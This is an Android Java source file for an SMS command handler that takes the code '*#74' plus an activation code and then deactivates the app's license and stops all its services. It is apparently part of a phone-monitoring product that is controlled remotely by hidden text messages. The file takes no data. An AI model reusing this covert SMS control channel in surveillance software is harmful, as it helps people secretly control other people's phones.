package com.vvt.android.syncmanager.smscommand.interpreter;

import android.content.Context;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.resource.StringResource;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.android.syncmanager.smscommand.SmsCommandHelper;

public class SmsUninstall {
	
	private static final String TAG = "SmsUninstall";
	private static final boolean DEBUG = true;
 	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	public static final String COMMAND_ID = "*#74";
	
	// Uninstall product
	// <*#74><FK>
	public static String processCommand(final Context context, String[] tokens) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				(tokens.length == 2 && ! SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		if (!debugTagValidation) {
			return StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT;
		}
		
		// Check activation Code
		String activationCodeValidation = SmsCommandHelper.getActivationCodeValidation(tokens[1]);
		if (!activationCodeValidation.equals(StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		// On Android we cannot uninstall ourself so we do the next best thing 
		// -> Deactivate and ignore the response so the client is definitely inactive
		Main.getInstance().getLicenseManager().asyncDeactivate();
		
		// Stop all services
		// We can't uninstall the application without root
		// The only thing we can do is to make all services stopped, to save the battery
		Main.getInstance().stopServices();
		
		return StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK;
	}

}
